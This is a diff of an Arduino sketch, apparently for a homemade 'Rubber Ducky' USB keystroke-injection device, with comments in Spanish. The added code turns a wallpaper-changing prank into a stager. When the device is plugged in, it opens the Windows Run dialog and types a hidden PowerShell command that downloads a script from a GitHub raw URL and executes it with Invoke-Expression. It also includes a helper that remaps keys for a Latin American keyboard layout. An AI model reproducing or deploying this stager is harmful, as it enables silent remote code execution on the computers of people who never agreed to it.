@@ -1,40 +1,45 @@
 #include "Keyboard.h"
 
-// Configuración: URL de la imagen (Direct Link)
-const char* imageUrl = "https://raw.githubusercontent.com/M1ch43l-B/rubber-ducky-casero/main/src/jesucristo.jpeg";
+// SUSTITUYE ESTA URL por la URL "Raw" de tu archivo fondo.ps1 en GitHub
+const char* scriptUrl = "https://raw.githubusercontent.com/tu-usuario/tu-repo/main/fondo.ps1";
+
+void typeLatam(String text) {
+  for (int i = 0; i < text.length(); i++) {
+    char c = text[i];
+    if (c == ':') { Keyboard.press(KEY_LEFT_SHIFT); Keyboard.press('.'); } 
+    else if (c == '/') { Keyboard.press(KEY_LEFT_SHIFT); Keyboard.press('7'); }
+    else if (c == '-') { Keyboard.press('/'); } 
+    else if (c == '.') { Keyboard.press('.'); }
+    else if (c == ' ') { Keyboard.press(' '); }
+    else if (c == '\'') { Keyboard.press('-'); } // Comilla simple
+    else { Keyboard.press(c); }
+    delay(20);
+    Keyboard.releaseAll();
+  }
+}
 
 void setup() {
-  // Iniciamos la emulación de teclado
   Keyboard.begin();
+  delay(5000); // Tiempo para prepararse
 
-  // Esperar 2 segundos después de conectar para que el PC reconozca el "teclado"
-  delay(2000);
-
-  // 1. Abrir el comando "Ejecutar" (Win + R)
-  Keyboard.press(KEY_LEFT_GUI); // Tecla Windows
+  // 1. Abrir Ejecutar (Win + R)
+  Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
-  delay(100);
-  Keyboard.releaseAll();
-  delay(500);
-
-  // 2. Escribir el comando de PowerShell para cambiar el fondo
-  // Se usa 'powershell -w h' para que la ventana sea oculta (hidden)
-  String command = "powershell -w h -NoP -C \"$i='";
-  command += imageUrl;
-  command += "'; $p=\"\"$env:TEMP\\bg.jpg\"\"; (New-Object System.Net.WebClient).DownloadFile($i,$p); Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class W {[DllImport(\"\"user32.dll\"\")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);}'; [W]::SystemParametersInfo(20, 0, $p, 3)\"";
-
-  Keyboard.print(command);
   delay(200);
+  Keyboard.releaseAll();
+  delay(1000);
 
-  // 3. Ejecutar
+  // 2. El Stager: Descarga y ejecuta en una sola línea corta
+  // "IEX" significa "Invoke-Expression" (ejecuta lo que descargues)
+  typeLatam("powershell -NoP -W h -C \"IEX (iwr '");
+  typeLatam(scriptUrl);
+  typeLatam("')\""); 
+
+  delay(200);
   Keyboard.press(KEY_RETURN);
-  delay(100);
   Keyboard.releaseAll();
 
-  // Terminamos la emulación
   Keyboard.end();
 }
 
-void loop() {
-  // No necesitamos nada en el loop para que solo se ejecute una vez al conectar
-}
+void loop() {}
